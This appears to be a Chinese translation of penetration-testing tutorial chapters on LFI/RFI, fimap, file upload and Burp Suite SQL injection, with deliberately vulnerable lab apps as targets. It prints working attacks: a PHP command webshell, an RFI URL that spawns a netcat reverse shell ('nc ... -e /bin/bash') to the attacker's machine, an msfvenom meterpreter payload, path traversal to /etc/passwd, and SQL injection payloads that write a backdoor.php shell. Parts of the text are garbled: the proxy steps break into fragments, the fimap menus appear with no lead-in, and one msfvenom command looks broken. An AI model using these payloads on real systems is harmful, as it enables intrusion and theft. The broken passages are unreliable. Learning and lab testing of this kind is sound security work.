  \n在本节中，我们涵盖了大量内容。我们学习了什么是命令注入以及它是如何工作的。我们看到了如何向有漏洞的网页输入框中附加命令，从而允许我们在实际 Web 服务器上运行命令。然后我们看到了如何向服务器创建并上传远程\
  \ shell。有多种不同功能不同的远程 shell 可供选择。我们使用了 Metasploit 的 PHP `reverse_tcp` shell，但我们也可以上传任何想要的\
  \ PHP shell。\n\n希望在这一节中，你已经了解了为什么在 Web 应用中验证所有输入是多么重要的，以防止黑客在你的 Web 服务器上运行命令，甚至为其创建一个远程\
  \ shell。只允许你需要的输入文本类型并阻塞所有其他。这意味着如果你只需要文本字符串作为输入，不要允许数字或特殊字符。相反，如果寻找数值输入，则不要允许任何字母或符号作为输入。\n\
  \n## 第 18 章\n\n## LFI 和 RFI\n\n本地文件包含（LFI）和远程文件包含（RFI）是网页中的漏洞，允许恶意用户操纵网页 URL，从而直接访问服务器上的文件夹和文件（LFI），或连接到恶意的外部站点运行代码（RFI）。我们将使用\
  \ Metasploitable 中的 Mutillidae Web 演示这两种利用。\n\n在浏览器中访问 Mutillidae `(Metasploitable2\
  \ IP/mutillidae)`，并双击确认安全级别已设置为“0 (Hosed)”，如下所示：\n\n![](img/image00774.jpeg)\n\n\
  首先我们来看下 LFI，通过几个例子，然后学习 RFI。\n\n### 本地文件包含 (LFI)\n\nLFI 或文件路径穿越（file path transversal）允许攻击者访问服务器上他们不应访问的其他目录。在\
  \ `mutillidae` 中，导航到 `OWASP Top Ten/ A4 - Insecure Direct Object References/ Arbitrary\
  \ File Inclusion`。你会看到以下消息：\n\n“注意，Mutillidae 显示的页面由 `page` 变量的值决定。`page` 变量作为 URL\
  \ 查询参数传递。可能会出什么问题呢？”\n\n让我们更深入地探讨一下。注意地址栏中的 URL 路径 `/mutillidae/index.php?page=arbitrary-file-inclusion.php`\
  \ 包含 `?page =` 命令。在该命令之后列出的任何页面都将是页面。\n\n让我们看看如果手动操纵命令会发生什么。在地址栏中将当前页面名替换为 `home.php`：\n\
  \n![](img/image00775.jpeg)\n\n当你按下回车时，网站将显示“home”页面。如果 Web 服务器应用程序存在 LFI 漏洞，你只需使用目录导航命令就可以也可以访问底层的\
  \ Web 服务器。本质上，要执行 LFI，我们只需操纵被调用的页面名称，尝试访问服务器本身的信息。\n\n那么，如果我们在地址栏中输入上一个目录位置 (`../`)\
  \ 会发生什么呢？\n\n`http://192.168.1.68/mutillidae/index.php?page=../`\n\n![](img/image00776.jpeg)\n\
  \n这似乎除了抛出一个错误消息外什么都没做。但如果你阅读了该错误消息，它其实揭示了关于 Web 服务器布局的一些信息。`/var/www/mutillidae/`。所以，如果我们想访问根目录，我们需要回退几个目录。\n\
  \n例如，如果我们想查看 `/etc/passwd` 文件怎么办？理论上，我们需要使用几个 `../` 目录命令来退出 Web 服务器目录，然后输入我们想要访问的本地文件的位置。下图展示了这种技术\n\
  \n![](img/image00777.jpeg)\n\n注意第一部分是正常的 URL 请求，但我们没有使用现有的页面，而是输入了 LFI 尝试。如果你访问这个修改后的\
  \ URL，你应该能看到 Web 服务器 passwd 文件的副本：\n\n![](img/image00778.jpeg)\n\n如果你不同时获取同一目录下受保护的\
  \ `-shadow` 文件，你将无法破解密码，但你至少可以获得用户列表。我想知道受 LFI 漏洞的服务器上还能访问哪些信息呢？\n\n### Robots.txt、配置文件以及有趣信息\n\
  \nRobots.txt 用于防止搜索引擎抓取你可能不希望它们搜索和公开索引的网页部分。此文件有时指向 Web 服务器上的有趣信息。使用 LFI 我们可以查看\
  \ mutillidae 上的 `robots.txt` 文件。只需访问 `mutillidae/robots.txt`：\n\n![](img/image00779.jpeg)\n\
  \n注意存在几个有趣的目录。系统配置文件和文档确实可以帮助攻击者获取有关你的网络及其配置的有用信息。在列表中你可以看到 mutillidae 的设计者通过包含\
  \ `passwords` 目录给了我们一个甜头。如果我们不先看那里，就失职了。\n\n去访问 `mutillidae/passwords/`：\n\n`accounts.txt`:\n\
  \n1. `admin`, `adminpass`, `Monkey!!!`\n2. `adrian`, `somepassword`, `Zombie Films\
  \ Rock!!!`\n3. `john`, `monkey`, `I like the smell of confunk`\n4. `ed`, `pentest`,\
  \ `Commandline KungFu anyone?`\n\n噢看，用户名和密码！我们甚至为每个用户提供了一个签名标语。你会认为这在现实生活中很少发生，但多年来我见过很多非常不安全的，包括：\n\
  \n Web 应用登录页面上列出登录凭据。\n\n 在公共 Web 目录中发布敏感文档。\n\n\n\n\n\n`Phpinfo.php` 如果你能够访问它，它是另一个很有趣的文件。它包含了许多关于\
  \ PHP 的配置信息。当我们尝试运行 `mutillidae/phpinfo.php` 时，我们会看到：\n\n![](img/image00781.jpeg)\n\
  \n如你所见，如果你的网站受到 `LFI` 漏洞的影响，攻击者就可以从你的服务器访问大量敏感信息。包含安全测试人员感兴趣的额外信息（以及更多内容）的额外文件列表，可以在\
  \ Mubix 网站找到：\n\n[`github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List`](https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List)\n\
  \n在防御此类攻击时，某些网站开发者会自动在提供的页面名称末尾添加 `.php` 扩展名，认为这可以阻止此类攻击。因此从本质上说，如果攻击者输入“/etc/passwd”，Web\
  \ 服务器会自动将其更改为“/etc/passwd.php”。这自然会导致页面未找到的错误。但这并不是一种有效的防御技术，因为如果你在末尾加上一个空字节“%00”（/etc/passwd%00），它会将空字节视为文件名的结束，从而抵消对\
  \ `.php` 的添加。\n\n## 远程文件包含 (RFI)\n\n现在让我们快速查看 `RFI`。该技术与 `LFI` 类似，只不过我们不是尝试访问本地系统信息，而是尝试让\
  \ Web 服务器访问外部网站上的脚本。`RFI` 似乎再不再是攻击网站的一种可行方法了，因为即使在 Mutillidae 这个“故意漏洞”的 Web 应用中，你需要在\
  \ `PHP.ini` 文件中启用远程 URL 包含（参见 Mutillidae 安装章节）才能使其工作！\n\n我们可以通过在 Mutillidae 站点中插入“http://www.google.com/”作为页面引用来插入对\
  \ Google 的调用，看到 `RFI` 的简单示例：\n\n![](img/image00782.jpeg)\n\n如你所见，Google 搜索页面已被插入到我们的\
  \ Mutillidae 站点中！这是一个严重的漏洞，因为攻击者可以引用任何外部网站，包括包含恶意代码的网站，这些代码将在目标 Web 服务器上执行。一个恶意的\
  \ `RFI` URL 示例如下：\n\n![](img/image00783.jpeg)\n\n在上面的图片中，第一部分是合法的网站目标前缀，而第 2 部分是我们尝试运行的恶意远程包含。那里有很多\
  \ Shell 程序可以供下载并使用，以在受 `RFI` 影响的系统中获取远程 Shell。但让我们来看看如何使用 `Netcat` 获取远程 Shell。\n\
  \n## 远程文件包含到 Shell\n\n去年，Chris Andrè Dale 在一个 SANS 视频竞赛中展示了一个关于本地文件包含到 Shell 的有趣视频（链接\
  \ [`www.youtube.com/watch?v=jEU8w3h1u1o`](https://www.youtube.com/watch?v=jEU8w3h1u1o)）。我们将使用类似的技术通过远程文件包含快速获取一个\
  \ Shell。\n\n首先，我们需要创建一个恶意的 PHP 程序并将其存储在我们的 Kali 系统中。我不确定最初是谁编写了下面这段简单的 PHP Shell\
  \ 代码，但它似乎是一个用于 `RFI` 漏洞的非常常见的 PHP 代码，而且对我们来说非常好用：\n\n```php\n<?php\n\necho \"Command:\
  \ \".htmlspecialchars($_GET['cmd']);\n\nsystem($_GET['cmd']);\n\n?>\n```\n\n创建一个包含此代码的文本文件并将其保存在\
  \ Kali 的 `/var/www/` 目录下（确保 Apache Web 服务正在运行）。我将我的文件命名为“thisone.txt”。基本上，这个 PHP\
  \ 脚本告诉计算机运行通过 `cmd` 变量发送它的任何命令。\n\n我们将目标系统建立 `Netcat` 会话，因此我们需要在我们的 Kali 机器上创建一个\
  \ `Netcat` 监听会话。\n\n- 在 Kali 中打开终端并输入 `nc -l -v -p 4444`\n\n![](img/image00784.jpeg)\n\
  \n然后我们在 Kali 系统上需要做的就是访问目标网站并在 URL 中调用我们的脚本，如下：\n\n`http://192.168.1.68/mutillidae/index.php?cmd=nc\
  \ 192.168.1.39 4444 -e /bin/bash&page=http://192.168.1.39/thisone.txt`\n\n- `http://192.168.1.68/mutillidae/index.php`\
  \ 部分是目标网站。\n- `?cmd=nc 192.168.1.39 4444 -e /bin/bash` 部分是一个创建一个 `nc` 或 `Netcat`\
  \ 会话（远程 Shell）并回到 Kali 系统的命令。\n- 最后，`&page=http://192.168.1.39/thisone.txt` 部分告诉目标\
  \ Web 服务器使用我在本地 Kali Web 服务器上创建的恶意 PHP 脚本来处理该命令。\n\n在 Kali 中，当我们访问上述 URL 时：\n\n\
  ![](img/image00785.jpeg)\n\n目标 Web 服务器应该立即从它打开一个到我们的攻击 Kali 系统的 `Netcat` 远程 Shell\
  \ 会话！\n\n![](img/image00786.jpeg)\n\n如果我输入 `whoami`，我得到了用户名 `www-data` 和 `www-data`。\n\
  \n\n\n\n\n![](img/image00789.jpeg)\n\n就是这样；我们现在拥有了对 Web 服务器的远程 shell！完成后，输入“q”退出\
  \ shell 并返回 Fimap 的“Available Attacks”（可用攻击）菜单选项：\n\n![](img/image00790.jpeg)\n\n\
  ### 通过 Pentest Monkey 的反 Shell 进行利用\n\n现在，从“Available Attacks”菜单中选择选项 2 - “Spawn\
  \ Pentestmonkeys reverse shell”（生成 Pentestmonkey 反向 shell）。它会要求你输入 Kali 系统的 IP 地址和一个用于连接的端口。在收到提示时，输入你的\
  \ Kali IP 和端口 `4444`：\n\n![](img/image00791.jpeg)\n\nFimap 然后会要求你打开另一个终端窗口并运行 `Netcat`：\n\
  \n- 输入 `netcat -v -l -v -p 4444`\n- 然后在 fimap 中直接按回车，你就获得了一个远程 `Netcat` shell！\n\
  \n![](img/image00792.jpeg)\n\n我们现在已经在目标 Web 服务器上获得了一个反向 shell！\n\n### 批量扫描\n\n在上面的示例中，我们只针对一个漏洞页面。你也可以扫描整个网站的漏洞，并让\
  \ fimap 从中收集链接并存储它们，以便使用其批量扫描功能。\n\n1. 只需运行 `fimap` 并使用 `-H` 切换告诉它收集链接，`-u` 告诉它目标\
  \ IP，`-d [x]` 告诉它查找链接的深度，最后使用 `-w [outputdirectory]` 告诉它存储链接的位置，如下所示：\n\n```\nfimap\
  \ -H -u 'http://192.168.1.68' -d 3 -w /tmp/urllist\n```\n\n![](img/image00793.jpeg)\n\
  \n现在 Fimap 已经知道要检查哪些 URL，下一步我们将扫描所有 URL 的漏洞。\n\n2. 输入 `fimap -m -l '/tmp/urllist'`\n\
  \n这运行需要相当长的时间，因为我们让 fimap 几乎对整个 Metasploitable VM 执行了 LFI 和 RFI 漏洞扫描。但请看下结果：\n\n\
  ![](img/image00794.jpeg)\n\nFimap 在 Metasploitable VM 上发现了 688 处可能的文件包含问题！你可以滚动列表并查看返回结果。或者如果你想尝试利用这\
  \ 688 个问题之一，只需输入 `Fimap -x` 并开始操作即可：\n\n![](img/image00795.jpeg)\n\n### 使用 Google\
  \ Dorks 扫描\n\nFimap 的另一个有趣功能是通过“Google Dorks”通过 Google 扫描网站。你可以使用任何 Google Dork\
  \ 字符串扫描互联网，但我不会涵盖这一点，也不推荐运行它，因为可能存在伦理问题。\n\n### 总结\n\n在本节中，我们学习了如何使用 `Fimap` 命令对目标网站执行自动化文件包含攻击。我们看到\
  \ fimap 允许你扫描单个 URL 的漏洞，也可以使用它的批量扫描功能扫描整个 URL 范围的漏洞并利用这些漏洞获取远程 shell。\n\n# 第 20\
  \ 章\n\n## 文件上传\n\n文件上传正如其名，是通过漏洞的 Web 接口上传文件或 shell 然后执行它。这是最简单的漏洞利用形式之一。技巧在于找到\
  \ Web 服务器存储文件的位置，以便我们可以尝试远程访问。实现此点的方法是上传一个测试文件，然后简单地从网站访问它。\n\n在本节中，我们将再次使用 Metasploitable\
  \ VM 中的 DVWA 测试环境。\n\n![](img/image00796.jpeg)\n\n1. 访问 DVWA 应用并登录。\n2. 点击“DVWA\
  \ Security”并将安全级别设置为“low”（低）：\n\n![](img/image00797.jpeg)\n3. 从 DVWA 菜单中选择“Upload”（上传）\n\
  4. 上传文件并查看 Web 服务器是否提供了关于其存储位置的任何线索。我只是创建了一个名为 `helloworld.txt` 的文本文件，内容正如你猜的那样，“Hello\
  \ World!”\n5. 浏览并上传该文件：\n\n![](img/image00798.jpeg)\n\n如上面的图片所示，DVWA 非常友好地提供了上传目录的路径。如果你在现实生活中真的收到这样的消息，那就太幸运了。让我们花点时间分析地址栏中当前的上传\
  \ URL：\n\n`http://192.168.1.135/dvwa/vulnerabilities/upload/#`\n\n上一张图片中的消息告诉我们，文件存储在当前目录上两个目录（`../../`），然后在\
  \ `hackable/uploads` 目录下。类似于这样：\n\n![](img/image00799.jpeg)\n\n返回两个目录级：\n\n![](img/image00800.jpeg)\n\
  \n然后输入我们的目标路径，我们得到了最终地址：\n\n![](img/image00801.jpeg)\n\n让我们尝试一下。将 URL 放入你的浏览器并访问。Web\
  \ 应用程序应该弹出我们的“Hello World”文本消息并如所示显示：\n\n![](img/image00802.jpeg)\n\n很好，这很有趣——我们能够向服务器上传一个文本文件并确定它的存储位置。但我们用这些信息可以做什么呢？我们可以向\
  \ Web 服务器上传一个远程 shell 吗？\n\n### 通过文件上传获取远程 Shell\n\n由于没有文件限制，我们可以上传 PHP shell 并执行它。我们将使用\
  \ `msfvenom` 生成一个反向 shell。\n\n1. 使用 `msfvenom` 生成载荷：\n```\nmsfvenom -p php/meterpreter_reverse_tcp\
  \ LHOST=192.168.1.35 LPORT=4444 -f shell.php\n```\n\n2. 打开 `msfconsole` 并设置处理器：\n\
  ```bash\nuse exploit/multi/handler\nset payload php/meterpreter_reverse_tcp\nset\
  \ LHOST 192.168.1.35\nset LPORT 4444\nexploit\n```\n\n3. 通过 DVWA 上传接口上传 `shell.php`。\n\
  4. 在浏览器中访问文件以触发反向 shell。\n\n## 第 21 章\n\n## Burp Suite\n\n在本章中，我们将查看功能丰富的工具 Burp\
  \ Suite。\n\n作者：Portswigger\n网站：[`portswigger.net/burp/`](http://portswigger.net/burp/)\n\
  \n![](img/image00810.jpeg)\n\nKali Linux 自带了 Burp Suite 免费版（有专业版可用），包含以下功能：\n\n\
  - 应用程序爬虫\n- 拦截代理\n- 高级 Web 应用程序扫描\n- Intruder 工具\n\n由于 Burp 是一个拦截代理（它位于你的浏览器和网站之间），它允许你捕获传输中的网站流量并进行操纵。在本章中，我们将使用运行最新版本\
  \ Mutillidae 的 Windows 7 VM 作为目标。我们将使用 Burp Suite 探索针对网站的最大威胁之一：SQL 注入攻击。\n\n![](img/image00811.jpeg)\n\
  \n### 界面\n\n\n\n\n\n你可以通过多种方式启动 Burp - 在终端窗口中输入 `burpsuite`，从应用程序菜单或快速启动栏选择它。Burp\
  \ 启动后，你将看到主界面，由以下部分组成：\n\n1. 工具菜单 (Tool Menu)\n2. 过滤器选项菜单 (Filter Options Menu)\n\
  3. 站点地图/范围窗口 (Site Map/ Scope Window)\n4. URL 信息窗口 (URL Information Window)\n5.\
  \ 请求/响应窗口 (Request/ Response Window)\n\n![](img/image00812.jpeg)\n\n基本上，你从 `#1`\
  \ 选择目标或工具。在 `#2` 设置任何你需要的过滤器选项。在 `#3` 查看并选择网站范围和站点地图。在 `#4` 查看单个链接信息，最后在 `#5` 查看\
  \ HTML 请求/响应。\n\n工具菜单（#1`） 包含了你在处理网站时可以执行的操作。这些包括在本章中将使用的以下标签页：\n\n- `TARGET SITE\
  \ MAP` – 显示站点地图和项目范围\n- `PROXY` – 用于设置和控制拦截代理\n- `SPIDER` – 显示目标爬取信息\n- `INTRUDER`\
  \ – 自动化攻击\n- `DECODER` – 用于多种格式的编码/解码\n- `COMPARER` – 用于比较网页/响应之间的差异\n\n站点地图窗口（#3`）显示所有可用的目标\
  \ URL 链接，这些链接来自 Burp 通过扫描网页链接而执行的被动扫描，或者在主动爬取期间发现的页面。最后，请求/响应窗口（#5`）显示你可以查看和操作的实际\
  \ html 代码。\n\n我一直是一个“在做中学习”的人，所以让我们直接进入主题，通过一些功能性示例来看如何使用 Burp Suite 工具。\n\n## 目标站点地图与爬取\
  \ (Spidering)\n\n我们需要做的第一件事是在我们的网络浏览器中设置拦截代理。在 `IceWeasel` 中进入设置（settings）、选项（preferences）、高级（advanced），然后是网络（network）。在\
  \ `Network` 标签页下，点击设置（Settings）。点击手动代理配置（Manual Proxy Configuration），然后将 `HTTP Proxy`\
  \ 设置为 `localhost`，并将端口设置为 `8080`，然后点击 `OK`，如下所示：\n\n![](img/image00813.jpeg)\n\n\
  现在我们需要关闭 Burp 中的拦截代理。\n\n点击 `Proxy` 标签页，并确保 `intercept` 标签页中的 `Intercept` 设置为关闭（off）：\n\
  \n![](img/image00814.jpeg)\n\n当它关闭时，它将允许网页正常加载而不会中断。当拦截开启时，Burp 将激活拦截代理，并在每个阶段（发送/接收）停止网页处理，并在允许传输继续之前请求继续权限。在教程的稍后部分，我们将经常使用开启拦截的\
  \ Burp，但对于爬取，你可能希望将其关闭。\n\n现在，在你的 Kali 系统上，使用浏览器通过 `[IP Address]/Mutillidae` 访问\
  \ `Mutillidae`：\n\n![](img/image00815.jpeg)\n\n现在如果你查看 Burp，应该会发现在 `Target` 标签页下，它已经在站点地图窗口中自动填充了大量发现的信息：\n\
  \n![](img/image00816.jpeg)\n\n注意，列出了很多外部网站。我们只想对本地的 `Mutillidae` 系统工作，因此我们需要修改范围（`scope`）。\n\
  \n1. 点击你的 `Mutillidae` IP 地址前面的三角形。\n2. 现在单击单击 `Mutillidae` 将其高亮。\n3. 右键点击 `Mutillidae`\
  \ 并点击“添加到范围”（Add to Scope）：\n\n![](img/image00817.jpeg)\n4. 让我们清理一下我们的站点地图列表，点击过滤器菜单栏（界面图中的\
  \ `#2`）并点击“仅显示范围内的项目”（Show only In-Scope Items）：\n\n![](img/image00818.jpeg)\n\n\
  我们现在有一个非常整洁的站点地图：\n\n![](img/image00819.jpeg)\n\n现在让我们爬取整个 `Mutillidae` 站点。\n\n\
  1. 在站点地图中右键点击 `mutillidae`。\n2. 点击“爬取此分支”（Spider this Branch）：\n\n![](img/image00820.jpeg)\n\
  \nBurp 现在将爬取整个网页。我们可以随时通过点击工具菜单中的 `Spider` 标签页来检查爬取状态：\n\n![](img/image00821.jpeg)\n\
  \n当爬取完成后，站点地图将变得完整得多。点击 `Mutillidae` 旁边的三角形查看：\n\n![](img/image00822.jpeg)\n\n##\
  \ 拦截代理 (Intercepting Proxy)\n\n如前所述，当拦截代理开启时，它会拦截通常发送到目标网页的任何信息并允许你查看和操作代码。通过这种方式，你可以查看网站使用的变量，并在发送到\
  \ Web 服务器之前将其更改为不同的内容。让我们来看实际操作。\n\n你需要检查 `Proxy` 标签页下的 Options（选项）菜单，并确保勾选了 `Intercept\
  \ Client Requests`（拦截客户端请求）：\n\n![](img/image00823.jpeg)\n\n查看服务器响应也有帮助，为此确保也勾选了\
  \ `Intercept Server Responses`（拦截服务器响应）：\n\n![](img/image00824.jpeg)\n\n1. 现在，将拦截代理设置为关闭：\n\
  \n![](img/image00825.jpeg)\n2. 在 `Iceweasel` 中访问 `Mutillidae` 登录屏幕（只需打开你的 `Mutillidae`\
  \ 网站并点击顶部菜单的 `Login/ Register`）。你应该能看到以下屏幕：\n\n![](img/image00826.jpeg)\n3. 现在，开启拦截代理\n\
  \n4. 现在，在拦截代理设置为关闭 off.. the.\n\n... of of `Mutillidae`\n\n2.. of of `Mutillidae`\n\
  3. 现在再次登录，但在登录名处输入 `' or 1=1-- ` 作为用户名。确保双连字符后有一个空格，并点击 Login（登录）：\n\n![](img/image00830.jpeg)\n\
  \n你将立即以 admin 身份登录！除非你看到这种攻击如何通过欺骗使其无论如何始终为真来满足底层的 SQL 语句，否则这可能没有意义。看到这一点最简单的方法是通过输入表单向\
  \ SQL 服务器发送一个无效命令，看看是否会收到错误消息。\n\n4. 点击 `logout`（退出）\n5. 现在再次登录，但在用户名和密码处都输入：`'test`\n\
  \n![](img/image00831.jpeg)\n\n这将生成以下错误代码：\n\n![](img/image00832.jpeg)\n\n查看上面图片中的最后一行，`Query:\
  \ SELECT username FROM accounts WHERE username=''test';` 这准确地告诉了用户名是如何在 SQL 语句中使用的。\n\
  \nSQL 语句寻找的是：`username='test'`\n\n但当我们输入导致错误的用户名时，我们输入的是：`‘’test`\n\n\n\n\n此操作是将单引号（`’`）作为用户名的一部分传递，当这个单引号被放入\
  \ SQL 语句时，它实际上关闭了 `username` 开头的单引号，从而满足了 SQL 语句，导致 SQL 语句中包含了额外的单词 `test`，而该单词是非法的。当我们使用\
  \ `' or 1=1--` 时，它关闭了开头的用户名单引号，然后包含了一个有效的 SQL 比较（`or 1=1`），最后在末尾添加了 `“-- ””。`1=1`\
  \ 始终为真；它实际上可以是任何为真的比较。双连字符加空格也是一个有效的 SQL 语句；它是注释命令，告诉 SQL 忽略该行的剩余部分！\n\n因此，我们的输入\
  \ SQL 语句从：\n\n查询：`SELECT username FROM accounts WHERE username='George';`\n\n这原本是一个有效的请求，选择用户名\
  \ George，现在变成了：\n\n查询：`SELECT username FROM accounts WHERE username='' or 1=1--\
  \ ';`\n\n这不再包含用户名（注意连续的两个单引号，这通常会包含用户名），但它包含了比较语句 `or 1=1`，这是一个真语句。因此，在登录时，它简单地从数据库中提取第一个用户，即管理员！\n\
  \n这在用户信息界面（位于：`OWASP 2013 > A1 Injection (SQL) > SQLi Extract Data > User Info (SQL)`）中同样有效，可以快速显示所有用户及其密码：\n\
  \n![](img/image00833.jpeg)\n\n## 更高级的注入\n\nMutillidae 的创建者花费大量时间在 Hints（提示）菜单中加入了教程和命令示例。在较新版本的\
  \ Mutillidae 中，只需将 `Hints` 切换为 `Enabled (1 - 5cr1pt K1dd1e)`，屏幕上就会出现“Hints”菜单。该菜单是为\
  \ Mutillidae 的每个部分定制的，提供了海量信息，是一个非常棒的学习工具。我强烈建议你查看 Mutillidae 中不同的模块并阅读与其配套的详细提示部分。还有指向非常优秀的训练视频的链接。\n\
  \n现在是坏消息（有点像），我发现使用不同版本的 Mutillidae 时，这些示例并不总是开箱即用的，需要一些调整才能使其正常工作。我认为这是一个非常棒的学习体验！\n\
  \n让我们来看这样一个示例。在本节中，我们将看到如何通过 SQL 注入找到表中的列数，并从 Web 服务器主机提取数据。\n\n1. 在 Mutillidae\
  \ 中，在 SQL Injection Hints 菜单下找到此部分：\n\n![](img/image00834.jpeg)\n\n我们将使用位于 `OWASP\
  \ 2013 > A1 Injection (SQL) > SQLi Extract Data > User Info (SQL)` 的 `“user-info\"\
  ` 页面。\n\n2. 为了节省时间，我们不使用 Burp，只需从 `Using advanced techniques`（如上图所示）复制第一个命令，将其粘贴到用户名字段中，并点击\
  \ `“View Account Details”`：\n\n![](img/image00835.jpeg)\n\n这将返回以下错误：\n\n![](img/image00836.jpeg)\n\
  \n如果你仔细阅读信息，会发现原因是 `“The used SELECT statements have a different number of columns`。请密切注意错误信息，这并不是在说我们的命令有问题，而是列数数量有问题。我们在开头的占位符中没有足够的\
  \ `“Nulls\"` 来满足表的列数。\n\n### 解决方案 - 只需添加更多的 null！\n\n我们可以通过仅取语句 `' union select\
  \ null --`（我们不需要之前的整个语句，只需使用这个缩短版本），向其添加一个额外的 `“null\"`，并将其用于用户名字段中，直到错误消失为止。不要忘记命令末尾的空格。我们已经知道一个\
  \ null 是不起行的，所以让我们尝试两个：\n\n2. 输入 `' union select null, null --`\n\n![](img/image00837.jpeg)\n\
  \n当你点击 `“View Account Details”` 时 —— 你收到了相同的错误信息……\n\n这可能会让人有点沮丧，但实际上来说，你只需要不断添加\
  \ null 直到它正常运行而不报错为止。这项技术在作者的 YouTube 视频中演示了：\n\n[`www.youtube.com/watch?v=UcbZUmuMy3U`](https://www.youtube.com/watch?v=UcbZUmuMy3U)\n\
  \n视频显示他很快就找到了 null 的数量，但我会给你一个提示，花费的时间比他展示的要得多。如果你想自己尝试，请现在停止阅读并继续尝试直到成功为止。\n\n\
  好了，到底用了多少个 null？在我的机器上，我总共使用了七个才使其工作！\n\n`' union select null, null, null, null,\
  \ null, null, null --`\n\n当你得到正确的 null 数量时，将显示此屏幕：\n\n![](img/image00838.jpeg)\n\
  \n要查看列出的字段对应哪一个 `“null\"`，只需每次将一个 null 替换为数字。所以这个命令：\n\n`' union select null, 1,\
  \ null, null, null, null, null --`\n\n返回：\n\n`Username=1`\n`Password=`\n`Signature=`\n\
  \n注意，我们在第二个 null 位置放了数字 `\"1\"`，它显示在 Username 字段中。\n\n现在，让我们利用这些知识从 Windows 主机转储一个文件。我们将数字一\
  \ 替换为从示例中尝试的第一个 SQL 命令，将文件读取请求放在正确的位置，并用正确数量的 null 进行填充：\n\n`' union select null,\
  \ LOAD_FILE('../README') AS username, null, null, null, null, null --`\n\n输入后将返回一个来自服务器的\
  \ readme 文件！\n\n![](img/image00839.jpeg)\n\n这是通过使用 `Load_File` 命令打开 README 文件并将其显示在用户名字段中实现的。\n\
  \n### 通过 SQL 注入获取远程 Shell\n\n现在我们已经知道了列数，获取反向 shell 非常简单。我们将使用 Mutillidae 提示部分中的\
  \ shell，它通过创建一个简单的 PHP 命令提示符 `echo shell_exec($_REQUEST[\"pCommand\"])` 并使用 `INTO\
  \ DUMPFILE` 命令将其复制到 mutillidae 目录并命名为 `“backdoor.php\"`。\n\n1. 只需复制反向 shell 示例：\n\
  \n`' union select null,null,null,null,'<form action=\"\" method=\"post\" enctype=\"\
  application/x-www-form-urlencoded\"><table style=\"margin-left:auto; margin-right:auto;\"\
  ><tr><td colspan=\"2\">Please enter system command</td></tr><tr><td></td></tr><tr><td\
  \ class=\"label\">Command</td><td><input type=\"text\" name=\"pCommand\" size=\"\
  50\"></td></tr><tr><td></td></tr><tr><td colspan=\"2\" style=\"text-align:center;\"\
  ><input type=\"submit\" value=\"Execute Command\" /></td></tr></table></form><?php\
  \ echo \"<pre>\";echo shell_exec($_REQUEST[\"pCommand\"]);echo \"</pre>\"; ?>' INTO\
  \ DUMPFILE '....\\\\htdocs\\\\mutillidae\\\\backdoor.php' --`\n\n2. 添加正确数量的 null，在本例中为六个（html\
  \ 代码占据一个位置）：\n\n`' union select null,null,null,null,null,null,'<form action=\"\"\
  \ method=\"post\" enctype=\"application/x-www-form-urlencoded\"><table style=\"\
  margin-left:auto; margin-right:auto;\"><tr><td colspan=\"2\">Please enter system\
  \ command</td></tr><tr><td></td></tr><tr><td class=\"label\">Command</td><td><input\
  \ type=\"text\" name=\"pCommand\" size=\"50\"></td></tr><tr><td></td></tr><tr><td\
  \ colspan=\"2\" style=\"text-align:center;\"><input type=\"submit\" value=\"Execute\
  \ Command\" /></td></tr></table></form><?php echo \"<pre>\";echo shell_exec($_REQUEST[\"\
  pCommand\"]);echo \"</pre>\"; ?>' INTO DUMPFILE '....\\\\htdocs\\\\mutillidae\\\\\
  backdoor.php' --`\n\n3. 然后只需将其丢在用户名字段中并点击 `“view account details”`：\n\n![](img/image00840.jpeg)\n\
  \n在页面底部，注意你可以输入命令并点击 “Execute Command” 按钮运行它。但不仅如此；我们的小后门 PHP shell 也被复制到了服务器的 `/mutillidae/backdoor.php`！现在我们随时都可以访问\
  \ `backdoor.php` 页面并在服务器上执行命令了！\n\n![](img/image00841.jpeg)\n\n上方是在我们新后门中运行 `'dir'`\
  \ 命令的示例。就是这样；我们现在有了一个通过 SQL 注入创建的、功能完整的后门 shell！尽情尝试它并运行不同的命令，看看哪些是有效的，哪些无效，以及哪些程序（如\
  \ “calc”）只会在本地 Windows 系统上打开。\n\n### Burp Encoder/ Decoder\n\n\n\n\n既然你已经知道通过 SQL\
  \ 注入让简单的 PHP shellcode 发作用，请尝试插入不同的 PHP shellcode 并让它们运行。你可能需要对输入进行 URL 编码以确保其正确处理。Burp\
  \ 包含一个专门为此功能的 `Encoder/ Decoder`（编码/解码器）。\n\n- 直接点击 `Decoder` 菜单选项\n- 将你的代码粘贴到顶部框中\n\
  - 点击 `Encode as` 然后选择 `URL`：\n\n![](img/image00842.jpeg)\n\n然后你只需复制并粘贴生成的编码文本来替换未编码的版本。\n\
  \n现在我们已经查看了基础 SQL 注入攻击，让我们来看看如何使用 `Intruder` 自动化攻击。\n\n# 使用 Burp Intruder 和 Compare\
  \ 自动化攻击\n\n现在我们已经知道如何使用拦截（intercept）来添加自己的数据，让我们看看如何通过 Burp 的 `Intruder` 和 `Compare`\
  \ 功能将此应用于攻击中。`Intruder` 允许你对捕获的代码运行自动化攻击。`Compare` 用于查找网页页面之间的差异；我们可以使用 `compare`\
  \ 来判断自动化攻击何时成功。\n\n首先，我们将查看如何使用 `Intruder` 自动化简单的 SQL 注入技术，然后看看它如何用于字典密码攻击。\n\n\
  ## 自动化 SQL 注入示例\n\n在上面的 SQL 注入示例中，寻找列数需要经过多次手动迭代。如果我们能用 Burp 自动化 SQL 注入命令会怎样？我们可以通过\
  \ `Intruder` 实现。在这个示例中，我们将为上面尝试过的命令创建一个简单的文本列表，并让 Burp 自动为我们尝试它们。\n\n`Sniper` 攻击针对单个变量；你可以在\
  \ Burp 中选择不同的攻击类型，使用多个负载攻击多个变量。但对于这个简单的示例，`Sniper` 效果很好。\n\n1. 创建一个名为 `union.txt`\
  \ 的文本文件并保存到桌面。包含以下命令：\n   - `' union select null --`\n   - `' union select null,\
  \ null --`\n   - `' union select null, null, null --`\n   - `' union select null,\
  \ null, null, null --`\n   - `' union select null, null, null, null, null --`\n\
  \   - `' union select null, null, null, null, null, null --`\n   - `' union select\
  \ null, null, null, null, null, null, null --`\n   - `' union select null, null,\
  \ null, null, null, null, null, null --`\n   注意，我们使用的是带递增 null 的 `Union Select`\
  \ 语句。不要忘记结尾的空格。\n\n2. 现在，在 Mutillidae 的 `User Info` 页面，使用凭据 `test/ test` 用 Burp\
